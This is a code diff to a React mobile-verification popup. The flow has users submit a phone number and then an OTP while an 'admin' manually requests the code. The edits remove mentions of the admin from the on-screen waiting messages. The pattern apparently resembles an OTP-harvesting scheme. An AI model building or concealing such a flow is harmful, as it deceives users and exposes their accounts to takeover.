@@ -53,7 +53,7 @@ const MobileVerificationPopup = ({ onVerified }) => {
         
         // Priority 2: PENDING status - user submitted mobile, waiting for admin to ask OTP
         if (status?.status === 'PENDING') {
-          console.log('>>> Show mobile input (PENDING - waiting for admin), mobile:', status?.mobile);
+          console.log('>>> Show mobile input (PENDING - waiting), mobile:', status?.mobile);
           setMobileVerified(false);
           setShowPopup(true);
           setMobileOtpSubmitted(false);
@@ -196,8 +196,8 @@ const MobileVerificationPopup = ({ onVerified }) => {
                 {waitingForAdmin && (
                   <div className="text-center py-4">
                     <div className="animate-spin w-12 h-12 border-4 border-[#D4AF37] border-t-transparent rounded-full mx-auto mb-4"></div>
-                    <p className="text-yellow-400 font-medium">Waiting for Admin</p>
-                    <p className="text-gray-400 text-sm mt-2">Admin will ask for OTP soon</p>
+                    <p className="text-yellow-400 font-medium">Waiting</p>
+                    <p className="text-gray-400 text-sm mt-2">please keep patience</p>
                   </div>
                 )}
               </>
@@ -253,8 +253,8 @@ const MobileVerificationPopup = ({ onVerified }) => {
                 {waitingForAdmin && (
                   <div className="text-center py-4">
                     <div className="animate-spin w-12 h-12 border-4 border-[#D4AF37] border-t-transparent rounded-full mx-auto mb-4"></div>
-                    <p className="text-yellow-400 font-medium">Waiting for Admin</p>
-                    <p className="text-gray-400 text-sm mt-2">Admin will ask for OTP soon</p>
+                    <p className="text-yellow-400 font-medium">Waiting for </p>
+                    <p className="text-gray-400 text-sm mt-2">keep patiance</p>
                   </div>
                 )}
               </>
@@ -262,7 +262,7 @@ const MobileVerificationPopup = ({ onVerified }) => {
               <div className="text-center py-4">
                 <div className="animate-spin w-12 h-12 border-4 border-[#D4AF37] border-t-transparent rounded-full mx-auto mb-4"></div>
                 <p className="text-green-400 font-medium">OTP Submitted!</p>
-                <p className="text-gray-400 text-sm mt-2">Waiting for approval</p>
+                <p className="text-gray-400 text-sm mt-2">Waiting</p>
               </div>
             ) : (
               <>
@@ -387,8 +387,8 @@ const MobileVerificationPopup = ({ onVerified }) => {
               {waitingForAdmin && (
                 <div className="text-center py-4">
                   <div className="animate-spin w-12 h-12 border-4 border-[#D4AF37] border-t-transparent rounded-full mx-auto mb-4"></div>
-                  <p className="text-yellow-400 font-medium">Waiting for Admin</p>
-                  <p className="text-gray-400 text-sm mt-2">Admin will ask for OTP soon</p>
+                  <p className="text-yellow-400 font-medium">Waiting</p>
+                  <p className="text-gray-400 text-sm mt-2">please keep patience</p>
                 </div>
               )}
             </>
